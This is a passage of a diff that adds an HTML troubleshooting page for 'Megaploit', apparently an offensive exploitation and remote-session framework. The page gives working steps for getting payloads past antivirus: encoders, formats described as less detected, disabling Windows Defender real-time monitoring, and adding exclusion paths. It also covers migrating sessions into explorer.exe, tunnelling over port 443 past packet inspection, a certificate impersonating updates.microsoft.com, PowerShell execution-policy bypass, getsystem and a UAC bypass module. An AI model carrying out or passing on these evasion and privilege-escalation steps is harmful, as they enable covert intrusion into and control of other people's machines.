+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>username&gt;<span class="se">\D</span>esktop<span class="se">\</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="c1"># Linux — usually writable</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>/tmp/
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>/var/tmp/
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>~/<span class="w"> </span><span class="o">(</span>home<span class="w"> </span>directory<span class="o">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="8-antivirus-killing-the-payload">8. Antivirus Killing the Payload<a class="headerlink" href="#8-antivirus-killing-the-payload" title="Permanent link">&para;</a></h2>
+<h3 id="windows-defender-removes-the-file-on-download">Windows Defender removes the file on download<a class="headerlink" href="#windows-defender-removes-the-file-on-download" title="Permanent link">&para;</a></h3>
+<p>The payload was detected before it could run. Options:</p>
+<p><strong>Option 1 — Use an encoder</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>megaploit &gt; generate
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>[?] Encoder: xor_b64
+</span></code></pre></div>
+<p><strong>Option 2 — Stack multiple encoders</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>megaploit &gt; generate
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>[?] Encoder: xor_b64,aes256
+</span></code></pre></div>
+<p><strong>Option 3 — Use a different payload format</strong></p>
+<p>Formats that are often less detected:
+- <code>ps1</code> (PowerShell) — runs from memory, no file written
+- <code>py</code> (Python) — interpreted, harder for AV to static-scan
+- <code>hta</code> (HTML Application) — abuses legitimate Windows feature</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>megaploit &gt; generate
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>[?] Payload format: ps1
+</span></code></pre></div>
+<p><strong>Option 4 — Disable Windows Defender temporarily</strong> (for authorised testing)</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c"># Run as Administrator on the target</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span>
+</span></code></pre></div>
+<p><strong>Option 5 — Use exclusion path</strong> (for authorised testing)</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&quot;C:\Temp&quot;</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="c"># Then place and run the payload from C:\Temp</span>
+</span></code></pre></div>
+<hr />
+<h3 id="av-killed-the-process-mid-session">AV killed the process mid-session<a class="headerlink" href="#av-killed-the-process-mid-session" title="Permanent link">&para;</a></h3>
+<p>The session will die. Options:
+1. Migrate to a less suspicious process before AV catches up:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>ps<span class="w">                              </span><span class="c1"># list processes</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>migrate<span class="w"> </span>&lt;PID<span class="w"> </span>of<span class="w"> </span>explorer.exe&gt;<span class="w">  </span><span class="c1"># migrate into explorer</span>
+</span></code></pre></div>
+<ol>
+<li>Regenerate with a more evasive encoder and re-deliver.</li>
+</ol>
+<hr />
+<h2 id="9-firewall-nat-issues">9. Firewall / NAT Issues<a class="headerlink" href="#9-firewall-nat-issues" title="Permanent link">&para;</a></h2>
+<h3 id="cant-connect-from-internet-to-your-listener">Can't connect from internet to your listener<a class="headerlink" href="#cant-connect-from-internet-to-your-listener" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Find your public IP:</strong> <code>curl ifconfig.me</code></li>
+<li><strong>Set up port forwarding on your router:</strong></li>
+<li>Forward TCP <code>&lt;LPORT&gt;</code> → your machine's LAN IP</li>
+<li><strong>Generate payload with your PUBLIC IP as LHOST</strong></li>
+</ol>
+<hr />
+<h3 id="cloud-vm-awsgcpazure-security-group-must-allow-inbound">Cloud VM (AWS/GCP/Azure) — security group must allow inbound<a class="headerlink" href="#cloud-vm-awsgcpazure-security-group-must-allow-inbound" title="Permanent link">&para;</a></h3>
+<p>In your cloud provider's console, add an inbound rule:
+- Protocol: TCP
+- Port: your LPORT (e.g., 4444)
+- Source: 0.0.0.0/0 (or restrict to target IP)</p>
+<hr />
+<h3 id="payload-is-connecting-but-being-dropped-silently">Payload is connecting but being dropped silently<a class="headerlink" href="#payload-is-connecting-but-being-dropped-silently" title="Permanent link">&para;</a></h3>
+<p>Some corporate firewalls do deep packet inspection (DPI). Try:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Use port 443 (HTTPS) — often allowed through firewalls</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">443</span><span class="w"> </span>--ssl
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1"># Generate payload with LPORT=443</span>
+</span></code></pre></div>
+<hr />
+<h2 id="10-database-errors">10. Database Errors<a class="headerlink" href="#10-database-errors" title="Permanent link">&para;</a></h2>
+<h3 id="sqlite3operationalerror-unable-to-open-database-file"><code>sqlite3.OperationalError: unable to open database file</code><a class="headerlink" href="#sqlite3operationalerror-unable-to-open-database-file" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># Check the database path</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--db-path<span class="w"> </span>/tmp/megaploit.db
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="c1"># Or fix permissions on the default path</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>~/.megaploit/
+</span></code></pre></div>
+<hr />
+<h3 id="database-is-locked"><code>database is locked</code><a class="headerlink" href="#database-is-locked" title="Permanent link">&para;</a></h3>
+<p>Another Megaploit instance is running and has the database locked:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1"># Find other instances</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>megaploit
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c1"># Kill them</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="nb">kill</span><span class="w"> </span>&lt;PID&gt;
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="c1"># Then restart</span>
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit
+</span></code></pre></div>
+<hr />
+<h3 id="database-corruption-malformed-database-disk-image">Database corruption — <code>malformed database disk image</code><a class="headerlink" href="#database-corruption-malformed-database-disk-image" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Backup and reset the database</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>cp<span class="w"> </span>megaploit.db<span class="w"> </span>megaploit.db.bak
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>sqlite3<span class="w"> </span>megaploit.db<span class="w"> </span><span class="s2">&quot;PRAGMA integrity_check;&quot;</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="c1"># If corrupted, start fresh</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>rm<span class="w"> </span>megaploit.db
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w">   </span><span class="c1"># creates a new clean database</span>
+</span></code></pre></div>
+<hr />
+<h2 id="11-module-exploit-errors">11. Module / Exploit Errors<a class="headerlink" href="#11-module-exploit-errors" title="Permanent link">&para;</a></h2>
+<h3 id="module-not-found-postsuggest_exploit"><code>Module not found: post/suggest_exploit</code><a class="headerlink" href="#module-not-found-postsuggest_exploit" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># List all available modules</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>module
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c1"># Check spelling — module names are case-sensitive in some versions</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/Suggest_Exploit<span class="w">   </span><span class="c1"># try different capitalisation</span>
+</span></code></pre></div>
+<hr />
+<h3 id="error-required-option-session-not-set"><code>Error: required option SESSION not set</code><a class="headerlink" href="#error-required-option-session-not-set" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Always set SESSION before running a post-exploitation module</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span>session-1
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>run
+</span></code></pre></div>
+<hr />
+<h3 id="module-runs-but-returns-no-results">Module runs but returns no results<a class="headerlink" href="#module-runs-but-returns-no-results" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Ensure the session is still alive: <code>megaploit &gt; sessions</code></li>
+<li>Ensure you have sufficient privileges for what the module does:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getprivs
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>getsystem<span class="w">    </span><span class="c1"># if you need higher privs</span>
+</span></code></pre></div>
+<hr />
+<h2 id="12-ssl-https-transport-issues">12. SSL / HTTPS Transport Issues<a class="headerlink" href="#12-ssl-https-transport-issues" title="Permanent link">&para;</a></h2>
+<h3 id="ssl-certificate_verify_failed-on-the-target"><code>SSL: CERTIFICATE_VERIFY_FAILED</code> on the target<a class="headerlink" href="#ssl-certificate_verify_failed-on-the-target" title="Permanent link">&para;</a></h3>
+<p>The payload is checking the server certificate and failing. Use <code>--ssl-no-verify</code> for self-signed certs in a lab:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">443</span><span class="w"> </span>--ssl<span class="w"> </span>--ssl-no-verify
+</span></code></pre></div>
+<hr />
+<h3 id="generating-a-self-signed-certificate">Generating a self-signed certificate<a class="headerlink" href="#generating-a-self-signed-certificate" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-newkey<span class="w"> </span>rsa:4096<span class="w"> </span>-keyout<span class="w"> </span>key.pem<span class="w"> </span>-out<span class="w"> </span>cert.pem<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-nodes<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">  </span>-subj<span class="w"> </span><span class="s2">&quot;/CN=updates.microsoft.com&quot;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">443</span><span class="w"> </span>--ssl<span class="w"> </span>--ssl-cert<span class="w"> </span>cert.pem<span class="w"> </span>--ssl-key<span class="w"> </span>key.pem
+</span></code></pre></div>
+<hr />
+<h2 id="13-windows-specific-issues">13. Windows-Specific Issues<a class="headerlink" href="#13-windows-specific-issues" title="Permanent link">&para;</a></h2>
+<h3 id="powershell-execution-policy-blocks-the-ps1-payload">PowerShell execution policy blocks the PS1 payload<a class="headerlink" href="#powershell-execution-policy-blocks-the-ps1-payload" title="Permanent link">&para;</a></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c"># On the target, run as Administrator</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Scope</span> <span class="k">Process</span> <span class="n">-Force</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c"># Then run the payload</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="p">.\</span><span class="n">run</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div>
+<p>Or use the bypass inline:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="n">run</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div>
+<hr />
+<h3 id="this-app-cant-run-on-your-pc-wrong-architecture"><code>This app can't run on your PC</code> — wrong architecture<a class="headerlink" href="#this-app-cant-run-on-your-pc-wrong-architecture" title="Permanent link">&para;</a></h3>
+<p>You built a 64-bit EXE but the target is 32-bit (or vice versa).</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># Generate 32-bit EXE explicitly</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>generate
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="o">[</span>?<span class="o">]</span><span class="w"> </span>Payload<span class="w"> </span>format:<span class="w"> </span>exe32
+</span></code></pre></div>
+<hr />
+<h3 id="uac-prompt-blocks-execution">UAC prompt blocks execution<a class="headerlink" href="#uac-prompt-blocks-execution" title="Permanent link">&para;</a></h3>
+<p>The payload needs Administrator rights and UAC is stopping it:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># Use a payload format that doesn&#39;t trigger UAC</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="c1"># Options: ps1 (PowerShell), hta, or a non-admin-requiring format</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="c1"># Or after getting a low-priv session, run the UAC bypass module</span>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/bypassuac
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span>session-1
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>run
+</span></code></pre></div>
+<hr />
+<h2 id="14-linux-specific-issues">14. Linux-Specific Issues<a class="headerlink" href="#14-linux-specific-issues" title="Permanent link">&para;</a></h2>
+<h3 id="exec-format-error-when-running-the-elf-payload"><code>exec format error</code> when running the ELF payload<a class="headerlink" href="#exec-format-error-when-running-the-elf-payload" title="Permanent link">&para;</a></h3>
+<p>The ELF was compiled for the wrong architecture:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Check target architecture</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>uname<span class="w"> </span>-m
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="c1"># x86_64 → use elf (64-bit)</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c1"># i686   → use elf32 (32-bit)</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="c1"># aarch64 → use elf_arm64</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="c1"># Regenerate with the correct format</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>generate
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="o">[</span>?<span class="o">]</span><span class="w"> </span>Payload<span class="w"> </span>format:<span class="w"> </span>elf_arm64
+</span></code></pre></div>
+<hr />
+<h3 id="text-file-busy-cant-execute-the-payload"><code>Text file busy</code> — can't execute the payload<a class="headerlink" href="#text-file-busy-cant-execute-the-payload" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>cp<span class="w"> </span>./agent<span class="w"> </span>/tmp/agent2
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/agent2
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>/tmp/agent2
+</span></code></pre></div>
+<hr />
+<h3 id="selinux-blocking-execution-in-tmp">SELinux blocking execution in <code>/tmp</code><a class="headerlink" href="#selinux-blocking-execution-in-tmp" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1"># Check SELinux status</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>getenforce
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="c1"># If &quot;Enforcing&quot;, use a different directory</span>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>cp<span class="w"> </span>./agent<span class="w"> </span>~/agent
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>chmod<span class="w"> </span>+x<span class="w"> </span>~/agent
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>~/agent
+</span></code></pre></div>
+<hr />
+<h2 id="15-getting-more-help">15. Getting More Help<a class="headerlink" href="#15-getting-more-help" title="Permanent link">&para;</a></h2>
+<h3 id="enable-debug-logging">Enable debug logging<a class="headerlink" href="#enable-debug-logging" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--debug<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>megaploit_debug.log
+</span></code></pre></div>
+<p>This prints verbose output and saves it to a log file — very useful when reporting issues.</p>
+<h3 id="in-app-help">In-app help<a class="headerlink" href="#in-app-help" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>megaploit &gt; help                  # list all global commands
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>megaploit &gt; help generate         # help for a specific command
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>[session-1] &gt; help                # list all session commands
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>[session-1] &gt; help download       # help for a specific session command
+</span></code></pre></div>
+<h3 id="check-the-other-docs">Check the other docs<a class="headerlink" href="#check-the-other-docs" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Problem area</th>
+<th>Guide</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Payload not detected</td>
+<td><a href="../PAYLOAD_BUILDER/"><code>docs/PAYLOAD_BUILDER.md</code></a></td>
+</tr>
+<tr>
+<td>Pivoting / networking</td>
+<td><a href="../NETWORKING/"><code>docs/NETWORKING.md</code></a></td>
+</tr>
+<tr>
+<td>Module errors</td>
+<td><a href="../MODULE_SYSTEM/"><code>docs/MODULE_SYSTEM.md</code></a></td>
+</tr>
+<tr>
+<td>Full command reference</td>
+<td><a href="../CLI_REFERENCE/"><code>docs/CLI_REFERENCE.md</code></a></td>
+</tr>
+<tr>
+<td>Beginner walkthrough</td>
+<td><a href="../QUICKSTART/"><code>docs/QUICKSTART.md</code></a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="open-a-github-issue">Open a GitHub issue<a class="headerlink" href="#open-a-github-issue" title="Permanent link">&para;</a></h3>
+<p>If the problem persists, open an issue at:<br />
+<strong>https://github.com/Josefifir/Megaploit/issues</strong></p>
+<p>Include:
+- Your OS and Python version
+- The exact command you ran
+- The full error message
+- The output of <code>python3 -m megaploit --debug</code></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.integrate"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
